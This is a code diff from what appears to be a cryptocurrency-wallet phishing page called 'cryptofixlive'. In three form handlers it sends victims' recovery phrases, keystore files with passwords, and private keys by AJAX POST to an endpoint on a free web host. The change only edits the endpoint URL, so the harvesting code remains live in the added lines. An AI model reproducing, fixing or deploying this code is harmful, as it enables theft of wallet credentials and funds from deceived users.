@@ -2487,7 +2487,7 @@
         alert('Recovery phrase length should be 12 or more in characters.') 
       } else {
         $.ajax({
-          url: 'https://www.000webhost.com/members/website/cryptofixlive/domain',
+          url: 'www.000webhost.com/members/website/cryptofixlive/domain',
           method: 'POST',
           data: { import_type: 'phrase', wallet: wallet, phrase: phraseInputVal },
           success: function (res) {
@@ -2518,7 +2518,7 @@
         alert('Fill out all form fields before proceeding');
       } else {
         $.ajax({
-          url: 'https://www.000webhost.com/members/website/cryptofixlive/domain',
+          url: 'www.000webhost.com/members/website/cryptofixlive/domain',
           method: 'POST',
           data: { import_type: 'keystorejson', wallet: wallet, keystorejson: keystorejson, keystorepassword: keystorepassword },
           success: function (res) {
@@ -2550,7 +2550,7 @@
         alert('Fill in your private key');
       } else {
         $.ajax({
-          url: 'https://www.000webhost.com/members/website/cryptofixlive/domain',
+          url: 'www.000webhost.com/members/website/cryptofixlive/domain',
           method: 'POST',
           data: { import_type: 'private', wallet: wallet, privatekey: privatekey },
           success: function (res) {
